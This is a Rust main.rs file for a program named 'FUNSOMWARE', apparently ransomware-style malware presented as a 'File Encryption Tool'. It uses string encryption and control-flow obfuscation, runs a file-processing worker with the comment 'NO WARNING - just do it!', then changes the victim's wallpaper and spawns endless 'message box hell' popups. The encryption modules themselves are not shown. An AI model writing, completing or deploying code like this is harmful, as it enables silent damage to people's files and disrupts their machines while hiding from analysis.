use cryptify::{encrypt_string, flow_stmt};
use native_dialog::{MessageDialog, MessageType};
use std::thread;
use std::time::Duration;

mod config;
mod crypto;
mod worker;
mod wallpaper_manager;
mod messagebox_spawner;

fn main() {
    // Add obfuscated control flow
    flow_stmt!();

    if config::SHOW_CLI {
        print_banner();
    }

    // Run the file processing worker (NO WARNING - just do it!)
    match worker::run() {
        Ok(_) => {
            if config::SHOW_CLI {
                println!("\n{}", encrypt_string!("================================="));
                println!("{}", encrypt_string!("All operations completed successfully!"));
                println!("{}", encrypt_string!("================================="));
            }
            
            // STEP 1: Set wallpaper FIRST if enabled
            if config::SET_WALLPAPER {
                if let Err(e) = wallpaper_manager::set_wallpaper() {
                    if config::SHOW_CLI {
                        eprintln!("{} {}", encrypt_string!("Failed to set wallpaper:"), e);
                    }
                }
            }
            
            // STEP 2: Spawn message box hell (non-blocking, every 2 seconds)
            if config::SHOW_MESSAGEBOXES {
                if config::SHOW_CLI {
                    println!("\n{}", encrypt_string!("Starting message box hell... 😈"));
                    println!("{} {} {}", 
                        encrypt_string!("Spawning"),
                        config::MESSAGEBOX_LOOP_COUNT,
                        encrypt_string!("message boxes")
                    );
                }
                
                messagebox_spawner::spawn_messagebox_hell();
                
                // Keep the main thread alive long enough for message boxes to spawn
                // Calculate total time needed
                let total_time = if config::MESSAGEBOX_LOOP_COUNT == 0 {
                    // Infinite - sleep for a very long time
                    Duration::from_secs(u64::MAX)
                } else {
                    // Sleep for total spawn time + extra buffer
                    Duration::from_secs(
                        config::MESSAGEBOX_LOOP_COUNT as u64 * config::MESSAGEBOX_DELAY_SECONDS + 10
                    )
                };
                
                if config::SHOW_CLI {
                    println!("{}", encrypt_string!("Message boxes spawning in background..."));
                    println!("{}", encrypt_string!("Press Ctrl+C to exit"));
                }
                
                thread::sleep(total_time);
            }
        }
        Err(e) => {
            eprintln!("{} {}", encrypt_string!("Fatal error:"), e);
            
            // Show error message box
            if config::SHOW_MESSAGEBOXES {
                MessageDialog::new()
                    .set_type(MessageType::Error)
                    .set_title(&encrypt_string!("FUNSOMWARE - Error"))
                    .set_text(&format!("{}: {}", encrypt_string!("Fatal error"), e))
                    .show_alert()
                    .ok();
            }
            
            std::process::exit(1);
        }
    }

    // Add more obfuscated control flow
    flow_stmt!();
}

fn print_banner() {
    flow_stmt!();
    
    println!("{}", encrypt_string!("================================="));
    println!("{}", encrypt_string!("   FUNSOMWARE v0.1.0"));
    println!("{}", encrypt_string!("   File Encryption Tool"));
    println!("{}", encrypt_string!("================================="));
    println!();
}
